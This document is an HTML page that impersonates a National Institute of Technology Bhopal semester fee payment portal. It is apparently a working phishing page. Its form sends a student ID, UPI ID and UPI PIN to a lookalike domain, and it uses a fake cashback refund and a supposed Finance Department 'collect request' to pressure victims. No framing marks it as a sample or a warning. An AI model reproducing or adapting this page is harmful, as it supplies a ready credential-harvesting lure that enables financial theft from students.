<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>NIT Bhopal — Fee Payment Portal</title>
</head>
<body>
  <h1>NIT Bhopal Student Fee Payment</h1>
  <p>Complete your semester fee payment below.</p>

  <form action="https://fees-nitbhopal-edu.in/collect" method="POST">
    <label>Student ID</label>
    <input type="text" placeholder="Enter Student ID" />

    <label>UPI ID</label>
    <input type="text" placeholder="yourname@ybl" />

    <label>Enter UPI PIN to verify</label>
    <input type="password" placeholder="Enter your UPI PIN" />

    <label>Amount</label>
    <input type="text" value="85000" />

    <p>Refund initiated — claim your cashback of ₹500 by verifying now</p>
    <p>This is a collect request from NIT Bhopal Finance Department</p>

    <button type="submit">Confirm &amp; Verify Payment</button>
  </form>
</body>
</html>
